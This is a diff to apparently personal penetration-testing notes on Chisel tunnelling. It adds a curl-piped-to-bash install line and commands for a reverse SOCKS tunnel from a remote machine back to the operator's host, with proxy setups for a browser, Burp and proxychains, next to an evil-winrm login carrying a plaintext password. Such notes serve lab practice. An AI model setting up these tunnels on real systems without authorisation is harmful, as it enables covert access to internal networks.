@@ -18,11 +18,17 @@ Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single 
 
 ## Installation
 [chisel](https://github.com/jpillora/chisel)
+
+For linux:
 `curl https://i.jpillora.com/chisel! | bash`
+
+For Windows:
+Go to the release page, get URL for 32bit or 64bit ( I used https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_windows_386.gz), wget, gunzip, change name to chisel.exe
+
+
 ## Commands
 
 to forward winrm:
-
 your machine
 `./chisel server --reverse -p 9002
 
@@ -32,6 +38,19 @@ pivot machine
 
 `evil-winrm -i 10.10.14.95 -u 'matthew' -p '147258369'
 
+### socks server
+On your machine:
+`./chisel server --reverse -p 9003`
+
+On remote machine:
+`chisel32.exe client 10.10.14.95:9003 R:socks`
+
+To use in the browser, set foxy proxy to socks5, 127.0.0.1, 1080.
+To use with burp, set browser to use burp proxy, then set socks proxy in burp by going to settings, network, connections
+
+To use with proxychains:
+`sudo echo "socks4 127.0.0.1 1080" >> /etc/proxychains.conf``
+(might be socks5)
 
 ___
 
